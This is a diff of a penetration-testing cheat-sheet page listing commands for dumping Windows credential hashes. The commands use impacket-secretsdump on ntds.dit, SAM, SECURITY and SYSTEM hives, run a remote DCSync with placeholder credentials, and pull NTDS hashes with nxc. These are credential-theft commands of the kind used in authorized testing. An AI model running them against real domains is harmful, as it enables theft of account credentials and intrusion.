@@ -204,19 +204,48 @@
   
   <li><a href="https://tldrbins.github.io/@nxc/">Nxc</a></li>
   
+  <li><a href="https://tldrbins.github.io/@dcsync/">Dcsync</a></li>
+  
 </ul>
 
 <div class="content"><hr>
+<h3 id="convert-ntdsdit-to-sqlite">Convert ntds.dit to .sqlite</h3>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/almandin/ntdsdotsqlite">ntdsdotsqlite</a></em></small></p>
 <h3 id="with-ntdsdit-and-system-hive">With ntds.dit and SYSTEM hive</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">impacket</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -ntds ntds.dit -system system LOCAL
-</span></span></code></pre></div><h3 id="with-sam-system-and-security-hives">With SAM, SYSTEM and SECURITY Hives</h3>
+</span></span></code></pre></div></div>
+</div></p>
+<h3 id="with-sam-system-and-security-hives">With SAM, SYSTEM and SECURITY Hives</h3>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">impacket</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
-</span></span></code></pre></div><h3 id="with-dcsync-right">With dcsync right</h3>
-<h4 id="impacket-secretsdump">impacket-secretsdump</h4>
+</span></span></code></pre></div></div>
+</div></p>
+<h3 id="with-dcsync-right">With Dcsync right</h3>
+<p>
+<button data-tabset="set3" data-tabcontent="tab1" class="active">impacket</button>
+
+<button data-tabset="set3" data-tabcontent="tab2" >nxc</button>
+
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET&gt;
-</span></span></code></pre></div><h4 id="nxc">nxc</h4>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb -dc-ip &lt;DC&gt; -u &lt;USER&gt; -H &lt;HASH&gt; --ntds
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
